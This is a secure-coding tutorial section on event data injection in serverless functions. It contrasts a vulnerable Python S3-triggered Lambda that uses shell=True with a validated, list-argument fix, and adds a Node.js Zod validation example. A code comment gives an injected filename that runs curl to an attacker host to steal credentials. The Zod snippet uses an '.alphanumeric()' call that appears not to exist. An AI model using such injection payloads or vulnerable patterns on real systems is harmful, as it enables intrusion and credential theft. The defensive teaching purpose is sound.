# 03 - Event Data Injection and Sanitization

Serverless functions consume events from various sources (HTTP, S3, SQS, DynamoDB). Because the structure of the `event` object changes depending on the trigger, it's easy for developers to blindly trust the incoming data, leading to injection vulnerabilities.

## ❌ Vulnerable Scenario: S3 Event Command Injection

Consider a Lambda function that processes uploaded image files. It is triggered by an S3 `ObjectCreated` event. The function extracts the filename from the event and uses a system command (`ImageMagick`) to resize it.

### Vulnerable Python Code
```python
import json
import os
import urllib.parse
import subprocess

def handler(event, context):
    # The event comes from S3
    for record in event['Records']:
        bucket = record['s3']['bucket']['name']
        
        # URL decode the object key (filename)
        key = urllib.parse.unquote_plus(record['s3']['object']['key'])
        
        download_path = f"/tmp/{key}"
        # ... download logic omitted ...

        # VULNERABLE: Command Injection via unvalidated S3 key
        cmd = f"convert /tmp/{key} -resize 50% /tmp/resized_{key}"
        
        # If an attacker uploads a file named: "image.jpg; curl http://attacker.com/steal-creds"
        # The OS will execute the curl command!
        subprocess.run(cmd, shell=True)
        
    return {"status": "success"}
```

## ✅ Secure Scenario: Input Validation & Safe Execution

To secure this, we must:
1. Validate the structure and content of the event data (the filename).
2. Avoid `shell=True` and pass arguments as an array to `subprocess.run`.

### Secure Python Code
```python
import json
import os
import urllib.parse
import subprocess
import re

def handler(event, context):
    for record in event['Records']:
        bucket = record['s3']['bucket']['name']
        key = urllib.parse.unquote_plus(record['s3']['object']['key'])
        
        # 1. Input Validation: Strictly allow only alphanumeric, dashes, underscores, and dots
        if not re.match(r'^[\w\-\.]+$', key):
            raise ValueError("Invalid filename detected!")
            
        download_path = f"/tmp/{key}"
        resized_path = f"/tmp/resized_{key}"
        # ... download logic omitted ...

        # 2. Secure Execution: Pass arguments as a list, and NEVER use shell=True
        # This treats the input strictly as data, not executable code.
        cmd = ["convert", download_path, "-resize", "50%", resized_path]
        
        try:
            subprocess.run(cmd, check=True)
        except subprocess.CalledProcessError as e:
            print(f"Error processing image: {e}")
            
    return {"status": "success"}
```

## 🛡️ Best Practices for Event Data

1. **Schema Validation:** Use libraries like `Joi` (Node.js), `Zod` (Node.js), or `Pydantic` (Python) to strictly validate the incoming `event` payload structure before processing it.
2. **Context-Aware Encoding:** If data extracted from an event is used in a database query, use parameterized queries (SQL) or native document APIs (NoSQL). If rendered to a UI, ensure proper XSS output encoding.
3. **Do not trust event sources:** Even internal event sources (like SNS or SQS) might carry data originally generated by a malicious user upstream. Validate at the boundaries of *every* function.

### Node.js Example with Zod (API Gateway Payload)

```javascript
const { z } = require('zod');

// Define strict schema
const userSchema = z.object({
  username: z.string().alphanumeric().min(3).max(20),
  email: z.string().email(),
});

exports.handler = async (event) => {
  try {
    const body = JSON.parse(event.body);
    
    // Parse and validate. Will throw if invalid.
    const validData = userSchema.parse(body);
    
    // Process validData...
    return { statusCode: 200, body: "User created" };
    
  } catch (err) {
    return { statusCode: 400, body: "Invalid input" };
  }
};
```
